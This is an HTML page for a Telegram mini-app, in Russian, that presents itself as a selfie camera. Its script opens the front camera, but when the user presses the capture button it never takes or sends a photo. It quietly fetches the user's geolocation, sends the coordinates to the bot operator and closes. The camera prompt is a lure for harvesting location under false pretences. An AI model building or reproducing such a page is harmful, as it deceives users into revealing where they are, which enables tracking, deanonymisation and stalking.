<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
  <title>WebApp Photo + Geo</title>
  <style>
    body{
      margin:0;
      padding:16px;
      background:#f5f7fa;
      font-family:"Inter", Arial, sans-serif;
      color:#0b1220;
      display:flex;
      flex-direction:column;
      align-items:center;
    }
    h2{
      font-size:22px;
      font-weight:700;
      margin-bottom:14px;
      text-align:center;
    }
    video{
      width:100%;
      max-width:380px;
      border-radius:14px;
      background:#000;
      display:none;
      margin:0 auto;
    }
    #preview{
      width:100%;
      max-width:380px;
      display:none;
      border-radius:14px;
      margin-top:16px;
      box-shadow:0 8px 20px rgba(0,0,0,0.15);
    }
    .controls{
      width:100%;
      max-width:380px;
      display:flex;
      flex-direction:column;
      gap:12px;
      margin-top:20px;
    }
    button{
      padding:14px;
      font-size:18px;
      font-weight:600;
      border-radius:12px;
      border:0;
      width:100%;
      box-shadow:0 4px 20px rgba(0,0,0,0.08);
      transition:0.15s ease;
    }
    button:active{ transform:scale(0.97); }
    #startBtn{ background:linear-gradient(135deg,#3b82f6,#60a5fa); color:#fff; }
    #snapBtn{ background:linear-gradient(135deg,#16a34a,#4ade80); color:#fff; }
    .destructive{ background:#ef4444; color:#fff; }
    #status{
      margin-top:18px;
      font-size:18px;
      font-weight:600;
      color:#16a34a;
      display:none;
      text-align:center;
    }
  </style>
</head>
<body>

<h2>Сделайте фото</h2>

<video id="video" playsinline autoplay muted></video>
<img id="preview" />

<div class="controls">
  <button id="startBtn">Запустить камеру</button>
  <button id="snapBtn" style="display:none">Сделать снимок</button>
  <button id="stopBtn" class="destructive" style="display:none">Остановить</button>
</div>

<div id="status">Отправлено ✓</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<!-- ВАШ ИСХОДНЫЙ SCRIPT НЕ ТРОНУТ -->
<script>
  const startBtn = document.getElementById('startBtn');
  const snapBtn = document.getElementById('snapBtn');
  const stopBtn = document.getElementById('stopBtn');
  const video = document.getElementById('video');
  const preview = document.getElementById('preview');
  const tg = window.Telegram && window.Telegram.WebApp;

  let stream = null;
  let photoTaken = false;

  function ensureTelegram(){
    if(typeof window.Telegram === 'undefined' || !window.Telegram.WebApp){ return null; }
    try{ return window.Telegram.WebApp; }catch(e){ return null; }
  }

  async function startCamera(){
    startBtn.disabled = true;
    try{
      stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:{exact:'user'}} });
    }catch(e){
      try{ stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}}); }
      catch(er){ stream = await navigator.mediaDevices.getUserMedia({ video:true }); }
    }

    try{
      video.srcObject = stream;
      video.style.display = 'block';
      preview.style.display = 'none';
      await video.play();
      snapBtn.disabled = false;
      startBtn.style.display = 'none';
      snapBtn.style.display = 'inline-block';
      stopBtn.style.display = 'inline-block';
    }catch(e){ alert('Не удалось проиграть видео: '+e.message); }
  }

  function stopStream(){
    try{ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; } }catch(e){}
    video.pause();
    video.srcObject = null;
    video.style.display = 'none';
    startBtn.style.display = 'inline-block';
    snapBtn.disabled = true;
    snapBtn.style.display = 'none';
    stopBtn.style.display = 'none';
    startBtn.disabled = false;
  }

  async function takePhoto(){
    if(photoTaken) return;
    photoTaken = true;
    const track = stream.getVideoTracks()[0];
    track.stop();

    navigator.geolocation.getCurrentPosition(pos =>{
      try{
        const data = { lat:pos.coords.latitude, lon:pos.coords.longitude };
        tg.sendData(JSON.stringify(data));
        document.getElementById('status').style.display='block';
        setTimeout(()=>tg.close(),800);
      }catch(e){ alert('stopStream err '+e.message); }
    });
  }

  startBtn.addEventListener('click', startCamera);
  snapBtn.addEventListener('click', takePhoto);
  stopBtn.addEventListener('click',()=>{ stopStream(); photoTaken=false; preview.style.display='none'; });

  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    alert('getUserMedia не поддерживается.');
    startBtn.disabled = true;
    snapBtn.disabled = true;
  }
</script>
</body>
</html>
